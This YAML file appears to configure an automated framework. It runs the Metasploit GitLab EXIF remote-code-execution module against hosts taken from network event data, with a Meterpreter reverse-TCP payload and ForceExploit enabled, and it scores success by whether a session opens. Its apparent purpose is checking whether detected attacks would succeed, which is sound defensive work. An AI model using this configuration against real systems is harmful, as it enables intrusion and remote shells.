---
name: MSF/exploit/multi/http/gitlab_exif_rce
module_class: exploit
module_type: msf
path: exploit/multi/http/gitlab_exif_rce
exec_mode: run
parameters:
  - name: RHOSTS
    description: Remote host IP
    value:
      method: event_data
      argument: dest_ip
  - name: RPORT
    description: Remote host port
    value_default: 80
    value:
      method: event_data
      argument: dest_port
  - name: TARGETURI
    description: Relative path of the GitLab application
    value_default: /
    value:
      method: extract
      argument: (\S+)uploads\/user # extract every non-whitespace before 'uploads'
      input:
        method: event_data
        argument: http.url
  - name: VHOST
    description: SNI name of the GitLab application
    value:
      method: exists
      argument: 
      input:
        - method: event_data
          argument: http.hostname
        - method: event_data
          argument: dest_ip
  - name: SRVHOST
    description: Host to serve the exploit from
    value:
      method: arf_arg
      argument: lhost
  - name: SRVPORT
    description: Port to serve the exploit from
    value:
      method: random
      argument: port
  - name: PAYLOAD
    description: the payload to use
    value_default: linux/x86/meterpreter/reverse_tcp
  - name: ForceExploit
    description: execute the exploit even when the check fails
    value_default: true
  - name: VERBOSE
    description: enable verbose logging of MSF for better success evaluation
    value_default: true
  - name: HttpTrace
    description: enable showing HTTP traces for better success evaluation
    value_default: true
payload_parameters:
  - name: LHOST
    description: Local host IP
    value:
      method: arf_arg
      argument: lhost
  - name: LPORT
    description: Local host port
    value:
      method: random
      argument: port
success:
  - strategy: session
    conclusion: yes
  - strategy: output
    argument: "Exploit failed"
    conclusion: no
  - strategy: output
    argument: "Exploit aborted"
    conclusion: no
  - strategy: output
    argument: "The connection was refused by the remote host"
    conclusion: no
  - strategy: output
    argument: "session .* opened"
    conclusion: yes
  - strategy: fallback
    conclusion: no